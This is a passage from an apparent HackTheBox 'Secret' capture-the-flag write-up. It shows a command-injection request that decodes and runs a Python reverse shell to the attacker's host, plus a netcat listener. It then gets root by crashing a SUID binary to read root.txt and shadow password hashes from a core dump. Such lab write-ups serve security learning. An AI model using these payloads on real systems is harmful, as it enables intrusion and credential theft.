<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret]</span><br><span class="line">└─<span class="comment"># curl &#x27;http://secret.htb/api/logs?file=;echo+cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjAiLDQ0MykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigic2giKSc=+|+base64+-d|+bash&#x27; -H &#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdmZWYyZDg5MzgyMTA0NTlhY2I3NGEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTc3NDI5MH0.-R0fMlWc1aeH9qhFtd2kwcp26ykHDtRBKLmhdduILAY&#x27;</span></span><br></pre></td></tr></table></figure>

<p>And boom we have the revshell</p>
<p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret]</span><br><span class="line">└─<span class="comment"># rlwrap nc -nlvp 443</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br><span class="line">Ncat: Connection from 10.10.11.120.</span><br><span class="line">Ncat: Connection from 10.10.11.120:37226.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(dasith) gid=1000(dasith) <span class="built_in">groups</span>=1000(dasith)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">dasith</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(dasith) gid=1000(dasith) <span class="built_in">groups</span>=1000(dasith)</span><br><span class="line">dasith@secret:~/local-web$</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">4b2b3d02130064c7a2da7ede04a7e856</span><br><span class="line">dasith@secret:~$</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2096.jpg"></li>
</ul>
<h1 id="PrivESC"><a href="#PrivESC" class="headerlink" title="PrivESC"></a>PrivESC</h1><h2 id="SUID-Binaries"><a href="#SUID-Binaries" class="headerlink" title="SUID Binaries"></a>SUID Binaries</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>Gives you an intresting file with setuid at &#x2F;opt&#x2F;count.<br>looking for the files in opt directory we are given the code for the binary too.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/opt$ <span class="built_in">ls</span></span><br><span class="line">code.c</span><br><span class="line">count</span><br><span class="line">valgrind.log</span><br></pre></td></tr></table></figure>

<p>So let’s go through the code.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dircount</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *summary)</span></span><br><span class="line">&#123;</span><br><span class="line">    DIR *dir;</span><br><span class="line">    <span class="type">char</span> fullpath[PATH_MAX];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">ent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fstat</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tot = <span class="number">0</span>, regular_files = <span class="number">0</span>, directories = <span class="number">0</span>, symlinks = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dir = opendir(path)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUnable to open directory.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((ent = readdir(dir)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ++tot;</span><br><span class="line">        <span class="built_in">strncpy</span>(fullpath, path, PATH_MAX-NAME_MAX<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(fullpath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="built_in">strncat</span>(fullpath, ent-&gt;d_name, <span class="built_in">strlen</span>(ent-&gt;d_name));</span><br><span class="line">        <span class="keyword">if</span> (!lstat(fullpath, &amp;fstat))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(S_ISDIR(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">                ++directories;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(S_ISLNK(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;l&quot;</span>);</span><br><span class="line">                ++symlinks;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(S_ISREG(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                ++regular_files;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IRUSR) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWUSR) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXUSR) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IRGRP) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWGRP) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXGRP) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IROTH) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWOTH) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXOTH) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;??????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;\t%s\n&quot;</span>, ent-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(summary, <span class="number">4096</span>, <span class="string">&quot;Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n&quot;</span>, tot, regular_files, directories, symlinks);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, summary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">filecount</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *summary)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> characters, words, lines;</span><br><span class="line"></span><br><span class="line">    file = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUnable to open file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please check if file exists and you have read privilege.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    characters = words = lines = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((ch = fgetc(file)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        characters++;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            lines++;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            words++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (characters &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        words++;</span><br><span class="line">        lines++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(summary, <span class="number">256</span>, <span class="string">&quot;Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n&quot;</span>, characters, words, lines);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, summary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">path_s</span>;</span></span><br><span class="line">    <span class="type">char</span> summary[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter source file/directory name: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, path);</span><br><span class="line">    getchar();</span><br><span class="line">    stat(path, &amp;path_s);</span><br><span class="line">    <span class="keyword">if</span>(S_ISDIR(path_s.st_mode))</span><br><span class="line">        dircount(path, summary);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        filecount(path, summary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// drop privs to limit file write</span></span><br><span class="line">    setuid(getuid());</span><br><span class="line">    <span class="comment">// Enable coredump generation</span></span><br><span class="line">    prctl(PR_SET_DUMPABLE, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Save results a file? [y/N]: &quot;</span>);</span><br><span class="line">    res = getchar();</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">121</span> || res == <span class="number">89</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Path: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, path);</span><br><span class="line">        FILE *fp = fopen(path, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(summary, fp);</span><br><span class="line">            fclose(fp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Could not open %s for writing\n&quot;</span>, path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Looking at the source code the write functionality looks intresting but the problem is that we cannot write in privilleged mode and not the content of file so there is no possible way we can write something to high-privileged file or see the content of higher privileged file.</p>
<p>The catch over here is that what if we crash the code in between the execution of the code.</p>
<p>Most of the time if we crash the process in between the report is most of the time saved in &#x2F;var&#x2F;crash in linux distro.</p>
<p>Normally this won’t be possible but with this perm set prctl(PR_SET_DUMPABLE, 1); it could be possible. I am still not sure about what it does exactly but here is the man page for this function if you are intrested.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9wcmN0bC4yLmh0bWw=">https://man7.org/linux/man-pages/man2/prctl.2.html<i class="fa fa-external-link-alt"></i></span></p>
<p>As far as I understand this determines whether core dumps are produced or not and by default it is always 1 so not sure why he manually did probably as a hint.</p>
<p>As it is set to 1 we can produce core dump so let’s test this thoery practically.</p>
<p>For this we need 2 shells so first make sure you have 2 shells.</p>
<p>1 -&gt; To run the count binary<br>2 -&gt; To create crash</p>
<h3 id="Shell-1"><a href="#Shell-1" class="headerlink" title="Shell 1"></a>Shell 1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/$ <span class="built_in">cd</span> /opt</span><br><span class="line">dasith@secret:/opt$ ./count -p</span><br><span class="line">/root/root.txt</span><br><span class="line">y</span><br></pre></td></tr></table></figure>

<p>Now let’s go to shell 2 to crash the binary</p>
<h3 id="Shell-2"><a href="#Shell-2" class="headerlink" title="Shell 2"></a>Shell 2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/opt$ ps -aux | grep count</span><br><span class="line">ps -aux | grep count</span><br><span class="line">root         853  0.0  0.1 235676  7468 ?        Ssl  12:11   0:00 /usr/lib/accountsservice/accounts-daemon</span><br><span class="line">dasith      1526  0.0  0.0   2488   588 pts/1    S+   14:29   0:00 ./count -p</span><br><span class="line">dasith      1534  0.0  0.0   6432   736 pts/3    S+   14:30   0:00 grep --color=auto count</span><br></pre></td></tr></table></figure>

<p>Now kill the process with the PID corresponding to .&#x2F;count -p</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/opt$ <span class="built_in">kill</span> -BUS 1526</span><br></pre></td></tr></table></figure>

<p>Now you can check the shell1 if the process is been crashed.</p>
<h3 id="Shell-1-1"><a href="#Shell-1-1" class="headerlink" title="Shell 1"></a>Shell 1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/opt$ ./count -p</span><br><span class="line">/root/root.txt</span><br><span class="line">y</span><br><span class="line">bash: [67393: 3 (255)] tcsetattr: Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">Path: Bus error (core dumped)</span><br></pre></td></tr></table></figure>

<p>Indeed we have crashed the process so lets check the &#x2F;var&#x2F;crash for the report.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/opt$ <span class="built_in">cd</span> <span class="built_in">cd</span> /var/crash</span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">cd</span> /var/crash</span><br><span class="line">bash: <span class="built_in">cd</span>: too many arguments</span><br><span class="line">dasith@secret:/opt$ <span class="built_in">cd</span> /var/crash</span><br><span class="line"><span class="built_in">cd</span> /var/crash</span><br><span class="line">dasith@secret:/var/crash$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 88</span><br><span class="line">drwxrwxrwt  2 root   root    4096 Nov  1 14:30 .</span><br><span class="line">drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..</span><br><span class="line">-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash</span><br><span class="line">-rw-r-----  1 dasith dasith 28055 Nov  1 14:30 _opt_count.1000.crash</span><br><span class="line">-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash</span><br><span class="line">dasith@secret:/var/crash$ <span class="built_in">mkdir</span> /tmp/oopsie</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/oopsie</span><br><span class="line">dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/oopsie</span><br><span class="line">apport-unpack _opt_count.1000.crash /tmp/oopsie</span><br><span class="line">dasith@secret:/var/crash$ <span class="built_in">cd</span> /tmp/oopsie</span><br><span class="line"><span class="built_in">cd</span> /tmp/oopsie</span><br><span class="line">dasith@secret:/tmp/oopsie$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 436</span><br><span class="line">drwxr-xr-x  2 dasith dasith   4096 Nov  1 14:32 .</span><br><span class="line">drwxrwxrwt 13 root   root     4096 Nov  1 14:31 ..</span><br><span class="line">-rw-r--r--  1 dasith dasith      5 Nov  1 14:32 Architecture</span><br><span class="line">-rw-r--r--  1 dasith dasith 380928 Nov  1 14:32 CoreDump</span><br><span class="line">-rw-r--r--  1 dasith dasith     24 Nov  1 14:32 Date</span><br><span class="line">-rw-r--r--  1 dasith dasith     12 Nov  1 14:32 DistroRelease</span><br><span class="line">-rw-r--r--  1 dasith dasith     10 Nov  1 14:32 ExecutablePath</span><br><span class="line">-rw-r--r--  1 dasith dasith     10 Nov  1 14:32 ExecutableTimestamp</span><br><span class="line">-rw-r--r--  1 dasith dasith      5 Nov  1 14:32 ProblemType</span><br><span class="line">-rw-r--r--  1 dasith dasith     10 Nov  1 14:32 ProcCmdline</span><br><span class="line">-rw-r--r--  1 dasith dasith      4 Nov  1 14:32 ProcCwd</span><br><span class="line">-rw-r--r--  1 dasith dasith     53 Nov  1 14:32 ProcEnviron</span><br><span class="line">-rw-r--r--  1 dasith dasith   2144 Nov  1 14:32 ProcMaps</span><br><span class="line">-rw-r--r--  1 dasith dasith   1336 Nov  1 14:32 ProcStatus</span><br><span class="line">-rw-r--r--  1 dasith dasith      1 Nov  1 14:32 Signal</span><br><span class="line">-rw-r--r--  1 dasith dasith     29 Nov  1 14:32 Uname</span><br><span class="line">-rw-r--r--  1 dasith dasith      3 Nov  1 14:32 UserGroups</span><br></pre></td></tr></table></figure>

<p>We have the coredump file so let’s check it out using strings or else it will give out gibberish output.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dasith@secret:/tmp/oopsie$ strings CoreDump</span><br><span class="line">......snip......</span><br><span class="line">Path: esults a file? [y/N]: words      = 2</span><br><span class="line">Total lines      = 2</span><br><span class="line">oot/root.txt</span><br><span class="line">9a63b8e79189a6329d9a5b5eb241ead8</span><br><span class="line">aliases</span><br><span class="line">ethers</span><br><span class="line">......snip......</span><br></pre></td></tr></table></figure>

<p>Looks like we have the root flag.</p>
<ul>
<li>use the same way get the root hash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$6$/0f5J.S8.u.dA78h<span class="variable">$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D</span>/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::</span><br><span class="line">daemon:*:18659:0:99999:7:::</span><br><span class="line">bin:*:18659:0:99999:7:::</span><br><span class="line">sys:*:18659:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18659:0:99999:7:::</span><br><span class="line">games:*:18659:0:99999:7:::</span><br><span class="line">man:*:18659:0:99999:7:::</span><br><span class="line">lp:*:18659:0:99999:7:::</span><br><span class="line">mail:*:18659:0:99999:7:::</span><br><span class="line">news:*:18659:0:99999:7:::</span><br><span class="line">uucp:*:18659:0:99999:7:::</span><br><span class="line">proxy:*:18659:0:99999:7:::</span><br><span class="line">www-data:*:18659:0:99999:7:::</span><br><span class="line">backup:*:18659:0:99999:7:::</span><br><span class="line">list:*:18659:0:99999:7:::</span><br><span class="line">irc:*:18659:0:99999:7:::</span><br><span class="line">gnats:*:18659:0:99999:7:::</span><br><span class="line">nobody:*:18659:0:99999:7:::</span><br><span class="line">systemd-network:*:18659:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18659:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18659:0:99999:7:::</span><br><span class="line">messagebus:*:18659:0:99999:7:::</span><br><span class="line">syslog:*:18659:0:99999:7:::</span><br><span class="line">_apt:*:18659:0:99999:7:::</span><br><span class="line">tss:*:18659:0:99999:7:::</span><br><span class="line">uuidd:*:18659:0:99999:7:::</span><br><span class="line">tcpdump:*:18659:0:99999:7:::</span><br><span class="line">landscape:*:18659:0:99999:7:::</span><br><span class="line">pollinate:*:18659:0:99999:7:::</span><br><span class="line">usbmux:*:18852:0:99999:7:::</span><br><span class="line">sshd:*:18852:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18852::::::</span><br><span class="line">dasith:$6<span class="variable">$RM7seX</span>/Mzkds2S1x$.vkOBt4kRfs/6JRApNqvzZ1zM6W1FK8kNKyoBOVSuZbrdlOw.vPj2D7VC0y0sz2Eg2z5rj.GdK2ApMBFynjmR/:18873:0:99999:7:::</span><br><span class="line">lxd:!:18852::::::</span><br><span class="line">mongodb:!:18852:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2097.jpg"></li>
</ul>
<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
<li>.git dump with GitTools</li>
<li>js code audit</li>
<li>Git Dump Enumeration find jwt TOKEN_SECRET</li>
<li>forge jwt token with jwt_tool</li>
